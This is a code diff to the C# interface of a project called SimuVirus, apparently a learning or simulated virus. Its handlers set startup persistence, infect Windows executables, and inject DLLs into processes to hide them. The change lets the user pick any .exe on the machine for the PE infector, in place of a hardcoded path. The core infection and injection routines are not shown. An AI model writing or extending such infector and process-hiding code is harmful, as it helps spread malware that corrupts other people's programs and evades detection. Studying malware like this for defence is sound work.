@@ -15,6 +15,7 @@ using System.Windows.Shapes;
 using SimuVirus.deploy;
 using SimuVirus.tools;
 using System.Diagnostics;
+using System.Windows.Forms;
 
 namespace SimuVirus
 {
@@ -38,16 +39,29 @@ namespace SimuVirus
             {
                 Startup startup = new Startup();
                 startup.init_startup();
-                MessageBox.Show("设置开机启动成功");
+                System.Windows.Forms.MessageBox.Show("设置开机启动成功");
             }));
         }
 
         private void Infect_PE(object sender, RoutedEventArgs e)
         {
+            OpenFileDialog openFileDialog1 = new OpenFileDialog();
+            string pePath = null;
+
+            openFileDialog1.InitialDirectory = "c:\\";
+            openFileDialog1.Filter = "exe files(*.exe) | *.exe | All files(*.*) | *.*";
+            openFileDialog1.FilterIndex = 2;
+            openFileDialog1.RestoreDirectory = true;
+
+            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            {
+                pePath = openFileDialog1.FileName;
+            }
             tasks.Add(Task.Factory.StartNew(() =>
             {
                 Infect infect = new Infect();
-                infect.infectPe("C:\\Users\\etenal\\Downloads\\re的传统.exe");
+                if (pePath != null)
+                    infect.infectPe(pePath);    
             }));
         }
 
@@ -64,9 +78,9 @@ namespace SimuVirus
                 {
                     Inject inject = new Inject();
                     if (inject.injectDll(target.Id, dllPath))
-                        MessageBox.Show("隐藏进程成功");
+                        System.Windows.Forms.MessageBox.Show("隐藏进程成功");
                     else
-                        MessageBox.Show("隐藏进程失败");
+                        System.Windows.Forms.MessageBox.Show("隐藏进程失败");
                 }
             }));
         }
@@ -82,9 +96,9 @@ namespace SimuVirus
                 {
                     Inject inject = new Inject();
                     if (inject.injectDll(target.Id, dllPath))
-                        MessageBox.Show("注入成功");
+                        System.Windows.Forms.MessageBox.Show("注入成功");
                     else
-                        MessageBox.Show("注入失败");
+                        System.Windows.Forms.MessageBox.Show("注入失败");
                 }
             }));
         }
